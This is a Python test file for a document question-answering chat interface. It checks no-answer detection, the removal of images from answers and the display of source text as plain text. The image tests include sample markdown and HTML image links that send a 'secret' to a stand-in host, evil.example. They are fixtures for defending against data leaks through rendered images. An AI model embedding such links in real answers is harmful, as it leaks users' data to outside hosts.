"""Chat UI helper tests (no API calls, no browser). Run: python -m answer_engine.tests.test_app"""
from app import format_sources, is_no_answer, plain_text, remove_images
from answer_engine.schema import Chunk


def test_no_answer_detection():
    assert is_no_answer("I don't have that information in the available documents.")
    assert is_no_answer("The documents do not mention a Paris office. They list Chicago only.")
    assert not is_no_answer("Carllm is not available in Europe [1].")
    assert not is_no_answer("Maxine Thompson won the IIOTY award in 2023 [1].")
    # a corrected false premise cites what the documents do say, so its sources were used
    assert not is_no_answer("The excerpts do not contain any information about closing the Denver office. "
                            "Insurellm still has a Denver office [1][2].")


def test_images_are_removed_from_answers():
    answer = 'See this ![x](http://evil.example/?q=secret) and <img src="http://evil.example/a.png"> now [1].'
    cleaned = remove_images(answer)
    assert "evil.example" not in cleaned and cleaned.endswith("now [1].")
    assert remove_images("Read [the policy](https://example.com) [2].") == "Read [the policy](https://example.com) [2]."


def test_sources_show_document_text_as_plain_text():
    text = "Policy\n![tracker](http://evil.example/t.png)\n```\ncode\n```"
    shown = format_sources([Chunk(page_content=text, metadata={"source": "a.md", "section": "A > B"})])
    block = plain_text(text)
    assert block in shown and block.startswith("````text\n") and block.endswith("\n````")
    assert "### 1. A › B" in shown


if __name__ == "__main__":
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            fn()
            print("ok", name)
